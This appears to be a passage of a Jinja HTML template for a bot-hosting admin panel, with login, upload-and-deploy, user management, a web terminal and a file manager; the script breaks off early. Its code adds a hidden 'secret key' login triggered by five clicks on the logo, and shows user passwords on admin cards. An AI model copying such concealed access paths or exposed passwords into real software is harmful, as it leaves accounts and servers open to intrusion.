    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>{{ website_name }} · Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        /* ---------- RESET & BASE ---------- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: #05070d;
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .view {
            display: none;
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
        }
        .view.active {
            display: block;
        }

        /* ---------- LOGIN CARD ---------- */
        .login-card {
            position: relative;
            width: 100%;
            padding: 30px 20px;
            background: #0c1018;
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0, 0, 0, .5);
        }
        .login-card::before {
            content: "";
            position: absolute;
            inset: -3px;
            background: conic-gradient(#00e5ff, transparent, transparent, transparent, #00e5ff);
            animation: spin 4s linear infinite;
        }
        .login-card::after {
            content: "";
            position: absolute;
            inset: 3px;
            background: #0c1018;
            border-radius: 22px;
        }
        .login-content {
            position: relative;
            z-index: 2;
        }
        .login-icon {
            width: 110px;
            height: 110px;
            margin: auto;
            border: 3px solid #00e5ff;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 45px;
            color: #00e5ff;
            box-shadow: 0 0 20px #00e5ff;
            overflow: hidden;
            background: #0c1018;
            cursor: pointer;
            transition: transform 0.1s;
            user-select: none;
        }
        .login-icon:active {
            transform: scale(0.95);
        }
        .login-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
        }
        .login-title {
            margin: 25px 0;
            text-align: center;
            color: #cfffff;
            letter-spacing: 4px;
            font-size: 1.3rem;
        }
        .login-card select,
        .login-card input {
            width: 100%;
            margin: 12px 0;
            padding: 16px;
            background: #161b25;
            border: 1px solid #2b3240;
            border-radius: 15px;
            color: white;
            font-size: 16px;
            outline: none;
        }
        .login-card select option {
            background: #161b25;
        }
        .login-btn {
            width: 100%;
            margin-top: 20px;
            padding: 16px;
            border: none;
            border-radius: 15px;
            font-size: 18px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            background: linear-gradient(90deg, #7a00ff, #00d9ff);
            transition: opacity 0.2s;
        }
        .login-btn:hover {
            opacity: .9;
        }
        .login-error {
            color: #ff4d4d;
            text-align: center;
            font-size: 14px;
            margin-top: 10px;
            min-height: 22px;
        }
        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }

        /* ---------- USER DASHBOARD ---------- */
        .user-container {
            max-width: 400px;
            width: 100%;
            margin: 0 auto;
        }

        .user-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .user-title {
            letter-spacing: 3px;
            font-weight: 800;
            font-size: 1.2rem;
        }
        .hamburger {
            font-size: 28px;
            cursor: pointer;
            color: #fff;
            padding: 4px 8px;
            border-radius: 8px;
            transition: background 0.2s;
            user-select: none;
        }
        .hamburger:hover {
            background: rgba(255, 255, 255, 0.08);
        }
        .power-btn {
            color: #ff4d4d;
            font-size: 20px;
            cursor: pointer;
        }
        .user-header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        /* Upload Card */
        .upload-card {
            border: 1px dashed #00e5ff;
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            background: rgba(0, 229, 255, 0.05);
            position: relative;
            cursor: pointer;
        }
        .upload-card .settings-icon {
            position: absolute;
            top: 15px;
            right: 15px;
            border: 1px solid #00e5ff;
            padding: 5px 8px;
            border-radius: 6px;
            font-size: 14px;
            color: #00e5ff;
            cursor: pointer;
        }
        .cloud-icon {
            font-size: 40px;
            margin-bottom: 10px;
            color: #00e5ff;
        }
        .upload-card>div:nth-child(3) {
            color: #aaa;
            font-size: 14px;
        }
        .deploy-btn {
            background: #fff;
            color: #000;
            padding: 15px;
            border-radius: 10px;
            font-weight: 900;
            margin-top: 15px;
            text-transform: uppercase;
            cursor: pointer;
            border: none;
            width: 100%;
            font-size: 14px;
        }
        #fileCountDisplay {
            font-size: 12px;
            color: #888;
            margin-top: 8px;
        }

        /* Bot Cards */
        #botListContainer {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .bot-card {
            background: #111;
            border: 1px solid #333;
            border-radius: 15px;
            padding: 15px;
            transition: border-color 0.2s;
            cursor: pointer;
        }
        .bot-card:hover {
            border-color: #555;
        }
        .bot-card.selected {
            border-color: #00e5ff;
        }
        .bot-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .bot-name {
            font-weight: bold;
            font-size: 16px;
        }
        .bot-status {
            font-size: 12px;
            padding: 2px 12px;
            border-radius: 12px;
            font-weight: bold;
        }
        .bot-status.running {
            background: #00ff6a33;
            color: #00ff6a;
            border: 1px solid #00ff6a;
        }
        .bot-status.stopped {
            background: #555;
            color: #aaa;
            border: 1px solid #666;
        }
        .bot-uptime {
            font-size: 12px;
            color: #888;
            margin-bottom: 10px;
            font-family: monospace;
        }
        .bot-owner {
            font-size: 11px;
            color: #888;
            margin-bottom: 8px;
        }
        .bot-controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
        }
        .bot-controls button {
            border: none;
            padding: 10px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 12px;
            transition: background 0.2s, opacity 0.2s;
        }
        .bot-controls button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .btn-start {
            background: #00d4ff;
            color: #000;
        }
        .btn-stop {
            background: #ff4d4d;
            color: #fff;
        }
        .btn-edit {
            background: #4d88ff;
            color: #fff;
        }
        .btn-restart {
            background: #ffaa00;
            color: #000;
        }
        .btn-download {
            background: #2ecc71;
            color: #000;
        }
        .btn-delete {
            background: #400;
            color: #fff;
        }
        .btn-openbot {
            background: #1da1f2;
            color: #fff;
            grid-column: span 2;
            padding: 10px;
            border-radius: 8px;
            border: none;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .btn-openbot:hover {
            background: #1a8cd8;
        }
        .btn-full {
            grid-column: span 2;
            background: #222;
            color: #fff;
            margin-top: 5px;
        }
        .btn-full.danger {
            background: #400;
        }

        /* Console */
        .console-wrapper {
            display: flex;
            align-items: stretch;
            gap: 8px;
            margin-top: 15px;
        }
        .console {
            background: #000;
            color: #00ff6a;
            padding: 10px;
            font-family: monospace;
            font-size: 10px;
            border-radius: 8px;
            height: 100px;
            overflow-y: auto;
            border: 1px solid #333;
            line-height: 1.6;
            white-space: pre-wrap;
            flex: 1;
        }
        .copy-console-btn {
            background: transparent;
            border: none;
            color: #00e5ff;
            font-size: 24px;
            cursor: pointer;
            padding: 0 8px;
            display: flex;
            align-items: center;
            transition: transform 0.1s;
        }
        .copy-console-btn:hover {
            transform: scale(1.1);
        }

        /* Footer */
        .user-footer {
            text-align: center;
            margin-top: 30px;
        }
        .f-title {
            font-size: 22px;
            font-weight: 900;
            letter-spacing: 5px;
        }
        .f-sub {
            font-size: 11px;
            opacity: 0.6;
            margin-bottom: 15px;
        }
        .social-box {
            display: flex;
            justify-content: center;
            gap: 20px;
        }
        .social-box a {
            color: #fff;
            font-size: 20px;
            width: 40px;
            height: 40px;
            border: 1px solid #333;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            transition: border-color 0.2s;
        }
        .social-box a:hover {
            border-color: #00e5ff;
        }

        /* ---------- ADMIN OVERLAY (DRAWER) ---------- */
        .admin-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 999;
            justify-content: flex-end;
            animation: fadeIn 0.25s ease;
        }
        .admin-overlay.open {
            display: flex;
        }

        .admin-drawer {
            width: 100%;
            max-width: 480px;
            height: 100%;
            background: #0c1018;
            padding: 24px 20px;
            overflow-y: auto;
            box-shadow: -10px 0 30px rgba(0, 0, 0, 0.8);
            animation: slideIn 0.3s ease;
            display: flex;
            flex-direction: column;
        }

        .admin-drawer-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid #222;
        }
        .admin-drawer-header h2 {
            color: #00e5ff;
            font-size: 1.2rem;
            letter-spacing: 2px;
        }
        .admin-close-btn {
            background: none;
            border: none;
            color: #ff4d4d;
            font-size: 28px;
            cursor: pointer;
            padding: 0 6px;
        }

        .admin-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .admin-tabs button {
            flex: 1;
            padding: 12px;
            border: 1px solid #333;
            border-radius: 10px;
            background: transparent;
            color: #aaa;
            font-weight: bold;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
            min-width: 80px;
        }
        .admin-tabs button.active {
            background: #00e5ff22;
            border-color: #00e5ff;
            color: #00e5ff;
        }
        .admin-tabs button:hover {
            border-color: #555;
        }

        .admin-panel-content {
            flex: 1;
        }
        .admin-tab-content {
            display: none;
        }
        .admin-tab-content.active {
            display: block;
        }

        /* ---------- ADMIN USER CARDS ---------- */
        .list-item {
            background: #111;
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            padding: 14px 16px;
            margin-bottom: 14px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .list-item .row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
        }
        .list-item .row .info {
            flex: 1;
            min-width: 120px;
        }
        .list-item .info .uname {
            font-weight: 700;
            font-size: 15px;
            color: #fff;
        }
        .list-item .info .upass {
            font-size: 13px;
            color: #888;
            font-family: monospace;
        }
        .badge-role {
            font-size: 10px;
            padding: 2px 10px;
            border-radius: 20px;
            font-weight: bold;
            text-transform: uppercase;
            white-space: nowrap;
        }
        .badge-role.admin {
            background: #00e5ff33;
            color: #00e5ff;
            border: 1px solid #00e5ff55;
        }
        .badge-role.user {
            background: #444;
            color: #ccc;
            border: 1px solid #555;
        }
        .badge-role.banned {
            background: #ff333333;
            color: #ff4d4d;
            border: 1px solid #ff4d4d55;
        }

        .limit-group {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .limit-group label {
            color: #aaa;
            font-size: 13px;
            font-weight: bold;
        }
        .list-item .limit-input {
            width: 70px;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #fff;
            padding: 8px 6px;
            border-radius: 5px;
            font-size: 13px;
            outline: none;
            text-align: center;
        }
        .list-item .limit-input:focus {
            border-color: #00e5ff;
        }

        .btn-action {
            border: none;
            cursor: pointer;
            font-weight: bold;
            border-radius: 5px;
            padding: 8px 14px;
            font-size: 12px;
            white-space: nowrap;
        }
        .btn-set {
            background: #00e5ff33;
            color: #00e5ff;
            border: 1px solid #00e5ff55;
        }
        .btn-set:hover {
            background: #00e5ff55;
        }
        .btn-ban {
            background: #ff333333;
            color: #ff4d4d;
            border: 1px solid #ff4d4d55;
        }
        .btn-ban:hover {
            background: #ff4d4d33;
        }
        .btn-reset {
            background: #333;
            color: #fff;
            border: 1px solid #555;
        }
        .btn-reset:hover {
            background: #444;
        }
        .btn-del {
            background: #ff333333;
            color: #ff4d4d;
            border: 1px solid #ff4d4d55;
            width: 100%;
            padding: 10px;
            text-align: center;
        }
        .btn-del:hover {
            background: #ff4d4d33;
        }
        .btn-create {
            background: #00e5ff;
            color: #000;
            border: none;
            padding: 10px 18px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 13px;
        }
        .btn-create:hover {
            opacity: 0.9;
        }
        .btn-remove {
            background: transparent;
            color: #ff4d4d;
            border: 1px solid #ff4d4d55;
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 12px;
        }
        .btn-remove:hover {
            background: #ff4d4d22;
        }

        /* Create user form */
        #createUserForm {
            display: none;
            background: #1a1a1a;
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            border: 1px solid #2a2a2a;
        }
        #createUserForm input,
        #createUserForm select {
            background: #0c1018;
            border: 1px solid #333;
            color: #fff;
            padding: 12px;
            border-radius: 8px;
            width: 100%;
            margin-bottom: 10px;
            outline: none;
            font-size: 14px;
        }
        #createUserForm input:focus,
        #createUserForm select:focus {
            border-color: #00e5ff;
        }
        .create-row {
            display: flex;
            gap: 10px;
        }
        .create-row input {
            flex: 1;
        }

        /* Simple list for User Menu tab */
        .simple-list-item {
            background: #111;
            border: 1px solid #2a2a2a;
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .simple-list-item .info {
            display: flex;
            flex-direction: column;
        }
        .simple-list-item .info .uname {
            font-weight: 700;
            font-size: 14px;
            color: #fff;
        }
        .simple-list-item .info .upass {
            font-size: 12px;
            color: #888;
            font-family: monospace;
        }
        .simple-list-item .actions button {
            background: transparent;
            color: #ff4d4d;
            border: 1px solid #ff4d4d55;
            padding: 6px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 12px;
        }
        .simple-list-item .actions button:hover {
            background: #ff4d4d22;
        }

        .section-title {
            color: #00e5ff;
            font-size: 14px;
            font-weight: bold;
            margin: 18px 0 10px 0;
            border-bottom: 1px solid #222;
            padding-bottom: 6px;
        }

        .empty-msg {
            text-align: center;
            color: #555;
            padding: 20px 0;
            font-size: 14px;
        }

        /* ---------- TERMINAL ---------- */
        .terminal-box {
            background: #010409;
            color: #50fa7b;
            height: 350px;
            overflow-y: scroll;
            padding: 12px;
            border: 1px solid #30363d;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            white-space: pre-wrap;
            border-radius: 6px;
            margin-bottom: 10px;
            line-height: 1.6;
        }
        .terminal-box .prompt {
            color: #58a6ff;
        }
        .terminal-box .output {
            color: #50fa7b;
        }
        .terminal-box .error {
            color: #ff6b6b;
        }
        .terminal-controls {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }
        .terminal-controls input {
            flex: 1;
            background: #0d1117;
            border: 1px solid #30363d;
            color: white;
            padding: 14px;
            border-radius: 6px;
            font-size: 16px;
            outline: none;
            min-width: 150px;
        }
        .terminal-controls input:focus {
            border-color: #00e5ff;
        }
        .terminal-controls button {
            padding: 12px 20px;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-term-run {
            background: #238636;
            color: white;
        }
        .btn-term-run:hover {
            background: #2ea043;
        }
        .btn-term-stop {
            background: #da3633;
            color: white;
        }
        .btn-term-stop:hover {
            background: #f85149;
        }
        .btn-term-clear {
            background: #555;
            color: white;
        }
        .btn-term-clear:hover {
            background: #666;
        }

        /* ---------- CUSTOM MODAL ---------- */
        .custom-modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.8);
            z-index: 10001;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.2s ease;
        }
        .custom-modal-overlay.open {
            display: flex;
        }

        .custom-modal {
            background: #0c1018;
            border: 1px solid #2a2a2a;
            border-radius: 20px;
            padding: 30px 28px;
            max-width: 500px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
            text-align: left;
        }
        .custom-modal .modal-icon {
            font-size: 40px;
            margin-bottom: 12px;
            text-align: center;
            color: #00e5ff;
        }
        .custom-modal .modal-body {
            color: #eee;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        .custom-modal .modal-body textarea {
            width: 100%;
            background: #050807;
            color: #00ff88;
            border: 1px solid #333;
            border-radius: 6px;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 0.7rem;
            resize: vertical;
            tab-size: 4;
            min-height: 200px;
        }
        .custom-modal .modal-actions {
            display: flex;
            gap: 12px;
            justify-content: flex-end;
            flex-wrap: wrap;
        }
        .custom-modal .modal-actions button {
            padding: 12px 28px;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
            min-width: 100px;
            transition: background 0.2s;
        }
        .custom-modal .modal-actions .btn-confirm {
            background: #00e5ff;
            color: #000;
        }
        .custom-modal .modal-actions .btn-confirm:hover {
            background: #00d4f0;
        }
        .custom-modal .modal-actions .btn-cancel {
            background: #333;
            color: #fff;
            border: 1px solid #555;
        }
        .custom-modal .modal-actions .btn-cancel:hover {
            background: #444;
        }
        .custom-modal .modal-actions .btn-ok {
            background: #00e5ff;
            color: #000;
            width: 100%;
        }
        .custom-modal .modal-actions .btn-ok:hover {
            background: #00d4f0;
        }
        .custom-modal .modal-body .btn-sm {
            padding: 6px 14px;
            font-size: 0.55rem;
            border: 1px solid #33ddff;
            color: #33ddff;
            background: transparent;
            border-radius: 6px;
            cursor: pointer;
        }

        /* ---------- SETTINGS MODAL (from gear icon) ---------- */
        #settingsModalOverlay {
            z-index: 9999;
        }

        .settings-form label {
            display: block;
            color: #aaa;
            font-size: 13px;
            margin-top: 15px;
            margin-bottom: 4px;
        }
        .settings-form input[type="text"],
        .settings-form input[type="file"] {
            width: 100%;
            background: #161b25;
            border: 1px solid #2b3240;
            color: white;
            padding: 12px;
            border-radius: 8px;
            outline: none;
            font-size: 14px;
        }
        .settings-form input:focus {
            border-color: #00e5ff;
        }
        .settings-form .logo-preview {
            margin-top: 10px;
            max-width: 100px;
            max-height: 100px;
            border-radius: 50%;
            border: 2px solid #00e5ff;
        }
        .settings-form .btn-remove-logo {
            background: #ff3333;
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 8px;
        }
        .settings-form .btn-remove-logo:hover {
            background: #cc0000;
        }

        /* ---------- FILE MANAGER ---------- */
        .file-manager {
            max-height: 400px;
            overflow-y: auto;
            background: #0d1117;
            border-radius: 8px;
            padding: 10px;
        }
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            border-bottom: 1px solid #1e1e1e;
            cursor: pointer;
            transition: background 0.2s;
            user-select: none;
        }
        .file-item:hover {
            background: #1a1f2b;
        }
        .file-item.selected {
            background: #2a3a5a;
            border-left: 3px solid #00e5ff;
        }
        .file-item .name {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #ccc;
        }
        .file-item .name i {
            width: 20px;
            color: #00e5ff;
        }
        .file-item .name .dir-icon {
            color: #f0c674;
        }
        .file-item .size {
            font-size: 12px;
            color: #888;
        }
        .file-breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-bottom: 10px;
            padding: 8px;
            background: #1a1f2b;
            border-radius: 6px;
        }
        .file-breadcrumb span {
            color: #00e5ff;
            cursor: pointer;
            padding: 2px 6px;
            border-radius: 4px;
        }
        .file-breadcrumb span:hover {
            background: #2a3a5a;
        }
        .file-breadcrumb .sep {
            color: #555;
            cursor: default;
        }
        .file-context-menu {
            display: none;
            position: fixed;
            background: #1a1f2b;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 6px 0;
            z-index: 10002;
            min-width: 150px;
        }
        .file-context-menu .menu-item {
            padding: 8px 16px;
            color: #ccc;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .file-context-menu .menu-item:hover {
            background: #2a3a5a;
        }
        .file-context-menu .menu-item.danger {
            color: #ff4d4d;
        }

        /* ---------- ANIMATIONS ---------- */
        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
        @keyframes slideIn {
            0% { transform: translateX(60px); opacity: 0; }
            100% { transform: translateX(0); opacity: 1; }
        }

        ::-webkit-scrollbar {
            width: 4px;
        }
        ::-webkit-scrollbar-track {
            background: #0c1018;
        }
        ::-webkit-scrollbar-thumb {
            background: #333;
            border-radius: 4px;
        }

        @media (max-width: 480px) {
            .admin-drawer { max-width: 100%; padding: 18px 14px; }
            .list-item .row { flex-direction: column; align-items: stretch; }
            .list-item .limit-input { width: 100%; }
            .create-row { flex-direction: column; }
            .limit-group { flex-wrap: wrap; }
            .admin-tabs button { font-size: 11px; padding: 8px; }
            .terminal-controls { flex-wrap: wrap; }
            .terminal-controls input { width: 100%; }
            .bot-controls { grid-template-columns: 1fr 1fr; }
            .file-item { flex-wrap: wrap; }
        }
    </style>
</head>
<body>

    <!-- ============================================================ -->
    <!--  VIEW: LOGIN                                                   -->
    <!-- ============================================================ -->
    <div id="loginView" class="view {% if not logged_in %}active{% endif %}">
        <div class="login-card">
            <div class="login-content">
                <div class="login-icon" id="loginIcon">
                    {% if logo_url %}
                        <img src="{{ logo_url }}" alt="Logo" />
                    {% else %}
                        <i class="fa-solid fa-user"></i>
                    {% endif %}
                </div>
                <h1 class="login-title">{{ website_name }}</h1>
                <select id="loginRoleSelect">
                    <option value="user" selected>USER ACCESS</option>
                    <option value="admin">Admin</option>
                </select>
                <input type="text" id="loginUsername" placeholder="Enter Username" />
                <input type="password" id="loginPassword" placeholder="Password" />
                <button class="login-btn" id="loginBtn">ACCESS SYSTEM</button>
                <div class="login-error" id="loginError"></div>
            </div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!--  VIEW: USER DASHBOARD                                          -->
    <!-- ============================================================ -->
    <div id="userView" class="view {% if logged_in %}active{% endif %}">
        <div class="user-container">

            <!-- Header -->
            <div class="user-header">
                <div class="user-header-left">
                    <span class="hamburger" id="hamburgerBtn">☰</span>
                    <span class="user-title">{{ website_name }}</span>
                </div>
                <div class="power-btn" id="logoutBtn"><i class="fa-solid fa-power-off"></i></div>
            </div>

            <!-- Upload Card -->
            <div class="upload-card" id="uploadCard">
                {% if is_admin %}
                <div class="settings-icon" id="settingsIcon"><i class="fa-solid fa-sliders"></i></div>
                {% endif %}
                <div class="cloud-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
                <div id="uploadLabel">UPLOAD ZIP PROJECT</div>
                <div class="deploy-btn" id="deployBtn">DEPLOY SERVER</div>
                <input type="file" id="fileInput" style="display:none;" multiple accept=".zip,.py,.js,.go,.rb,.php,.sh,.pl,.json,.txt,.data" />
                <div id="fileCountDisplay"></div>
            </div>

            <!-- Bot List -->
            <div id="botListContainer"></div>

            <!-- Console with copy button -->
            <div class="console-wrapper">
                <div class="console" id="console">Select a bot to see logs.</div>
                
            </div>

            <!-- Footer -->
            <div class="user-footer">
                <div class="f-title">{{ website_name }}</div>
                <div class="f-sub">LOVE YOU ALL. SUPPORT KARO</div>
                <div class="social-box">
                    <a href="{{ social_links.telegram }}" target="_blank"><i class="fa-brands fa-telegram"></i></a>
                    <a href="{{ social_links.youtube }}" target="_blank"><i class="fa-brands fa-youtube"></i></a>
                    <a href="{{ social_links.instagram }}" target="_blank"><i class="fa-brands fa-instagram"></i></a>
                    <a href="{{ social_links.tiktok }}" target="_blank"><i class="fa-brands fa-tiktok"></i></a>
                </div>
            </div>

        </div>
    </div>

    <!-- ============================================================ -->
    <!--  ADMIN OVERLAY (DRAWER)                                        -->
    <!-- ============================================================ -->
    <div class="admin-overlay" id="adminOverlay">
        <div class="admin-drawer">

            <div class="admin-drawer-header">
                <h2><i class="fa-solid fa-shield-halved" style="margin-right:8px;"></i>ADMIN PANEL</h2>
                <button class="admin-close-btn" id="adminCloseBtn">✕</button>
            </div>

            <div class="admin-tabs">
                <button class="active" data-tab="tabAdminMenu">🛠️ ADMIN MENU</button>
                <button data-tab="tabUserMenu">👥 USER MENU</button>
                <button data-tab="tabTerminal">💻 TERMINAL</button>
                <button data-tab="tabFileManager">📁 FILES</button>
            </div>

            <div class="admin-panel-content">
                <!-- ADMIN MENU -->
                <div id="tabAdminMenu" class="admin-tab-content active">
                    <button class="btn-create" id="toggleCreateUserBtn" style="width:100%;margin-bottom:12px;">
                        <i class="fa-solid fa-plus"></i> NEW USER
                    </button>
                    <button class="btn-create" id="editProfileBtn" style="width:100%;margin-bottom:12px;background:#4d88ff;">
                        <i class="fa-solid fa-user-edit"></i> EDIT PROFILE
                    </button>
                    <div id="createUserForm">
                        <input type="text" id="newUsername" placeholder="Username" />
                        <input type="password" id="newPassword" placeholder="Password" />
                        <input type="text" id="newExpiry" placeholder="Expiry (Days, e.g. 1, 5, 30)" />
                        <select id="newRole">
                            <option value="user">User</option>
                            <option value="admin">Admin</option>
                        </select>
                        <button class="btn-create" id="createUserBtn" style="width:100%;">CREATE</button>
                    </div>
                    <div id="fullUserListContainer"></div>
                </div>

                <!-- USER MENU -->
                <div id="tabUserMenu" class="admin-tab-content">
                    <div class="section-title">👑 Admin List</div>
                    <div id="simpleAdminListContainer"></div>
                    <div class="section-title" style="margin-top:24px;">👤 User List</div>
                    <div id="simpleUserListContainer"></div>
                </div>

                <!-- TERMINAL -->
                <div id="tabTerminal" class="admin-tab-content">
                    <div class="terminal-box" id="terminalOutput">
                        <span class="prompt">$ </span>Connected...<br />
                    </div>
                    <div class="terminal-controls">
                        <input type="text" id="terminalCommand" placeholder="Type command or input..." />
                        <button class="btn-term-run" id="termRunBtn"><i class="fa-solid fa-play"></i> Run</button>
                        <button class="btn-term-stop" id="termStopBtn"><i class="fa-solid fa-stop"></i> Stop</button>
                        <button class="btn-term-clear" id="termClearBtn"><i class="fa-solid fa-eraser"></i> Clear</button>
                    </div>
                </div>

                <!-- FILE MANAGER -->
                <div id="tabFileManager" class="admin-tab-content">
                    <div class="file-breadcrumb" id="fileBreadcrumb"></div>
                    <div class="file-manager" id="fileManagerList"></div>
                    <div style="margin-top:10px;font-size:12px;color:#555;">Long press on item (or right-click) for actions</div>
                </div>
            </div>

        </div>
    </div>

    <!-- ============================================================ -->
    <!--  CUSTOM MODAL                                                 -->
    <!-- ============================================================ -->
    <div class="custom-modal-overlay" id="customModalOverlay">
        <div class="custom-modal">
            <div class="modal-icon" id="modalIcon">⚠️</div>
            <div class="modal-body" id="modalBody"></div>
            <div class="modal-actions" id="modalActions"></div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!--  SETTINGS MODAL (gear icon)                                   -->
    <!-- ============================================================ -->
    <div class="custom-modal-overlay" id="settingsModalOverlay">
        <div class="custom-modal">
            <div class="modal-icon" style="text-align:center;color:#00e5ff;"><i class="fa-solid fa-gear"></i></div>
            <div class="modal-body" id="settingsModalBody">
                <div class="settings-form">
                    <label>Website Name</label>
                    <input type="text" id="settingsWebsiteName" placeholder="Website name" />
                    
                    <label>Telegram Link</label>
                    <input type="text" id="settingsTelegram" placeholder="https://t.me/..." />
                    
                    <label>YouTube Link</label>
                    <input type="text" id="settingsYoutube" placeholder="https://youtube.com/..." />
                    
                    <label>Instagram Link</label>
                    <input type="text" id="settingsInstagram" placeholder="https://instagram.com/..." />
                    
                    <label>TikTok Link</label>
                    <input type="text" id="settingsTiktok" placeholder="https://tiktok.com/..." />
                    
                    <label>Upload Logo (PNG, JPG, GIF, WEBP)</label>
                    <input type="file" id="settingsLogoInput" accept="image/*" />
                    <div id="settingsLogoPreview"></div>
                    <button class="btn-remove-logo" id="settingsRemoveLogoBtn">Remove Logo</button>
                </div>
            </div>
            <div class="modal-actions">
                <button class="btn-cancel" id="settingsCancelBtn">Cancel</button>
                <button class="btn-confirm" id="settingsSaveBtn">Save Settings</button>
            </div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!--  CONTEXT MENU (file manager)                                  -->
    <!-- ============================================================ -->
    <div class="file-context-menu" id="fileContextMenu">
        <div class="menu-item" id="ctxDelete"><i class="fa-solid fa-trash"></i> Delete</div>
        <div class="menu-item" id="ctxRename"><i class="fa-solid fa-pen"></i> Rename</div>
        <div class="menu-item" id="ctxDownload"><i class="fa-solid fa-download"></i> Download</div>
    </div>

    <!-- ============================================================ -->
    <!--  JAVASCRIPT                                                   -->
    <!-- ============================================================ -->
    <script>
        (function() {
            'use strict';

            // ---------- GLOBAL FETCH INTERCEPTOR ----------
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {
                return originalFetch(url, options).then(response => {
                    if (response.status === 401) {
                        window.location.href = '/';
                        return Promise.reject('Unauthorized');
                    }
                    return response;
                });
            };

            // ---------- CUSTOM MODAL ----------
            const modalOverlay = document.getElementById('customModalOverlay');
            const modalIcon = document.getElementById('modalIcon');
            const modalBody = document.getElementById('modalBody');
            const modalActions = document.getElementById('modalActions');

            function showCustomModal(icon, bodyHTML, buttons) {
                return new Promise((resolve) => {
                    modalIcon.textContent = icon || '⚠️';
                    modalBody.innerHTML = bodyHTML || '';
                    modalActions.innerHTML = '';
                    buttons.forEach((btn) => {
                        const buttonEl = document.createElement('button');
                        buttonEl.textContent = btn.label;
                        buttonEl.className = btn.className || 'btn-confirm';
                        buttonEl.addEventListener('click', () => {
                            closeModal();
                            resolve(btn.value);
                        });
                        modalActions.appendChild(buttonEl);
                    });
                    modalOverlay.classList.add('open');
                });
            }

            window.customAlert = function(message, icon = 'ℹ️') {
                return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
                    { label: 'OK', value: true, className: 'btn-ok' }
                ]);
            };

            window.customConfirm = function(message, icon = '⚠️') {
                return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
                    { label: 'Cancel', value: false, className: 'btn-cancel' },
                    { label: 'OK', value: true, className: 'btn-confirm' }
                ]);
            };

            function closeModal() {
                modalOverlay.classList.remove('open');
            }

            // ---------- SECRET KEY LOGIN (Logo clicks) ----------
            let loginIconClickCount = 0;
            let loginIconTimer = null;

            document.getElementById('loginIcon').addEventListener('click', function(e) {
                loginIconClickCount++;
                clearTimeout(loginIconTimer);
                loginIconTimer = setTimeout(() => { loginIconClickCount = 0; }, 2000);

                if (loginIconClickCount >= 5) {
                    loginIconClickCount = 0;
                    showSecretKeyModal();
                }
            });

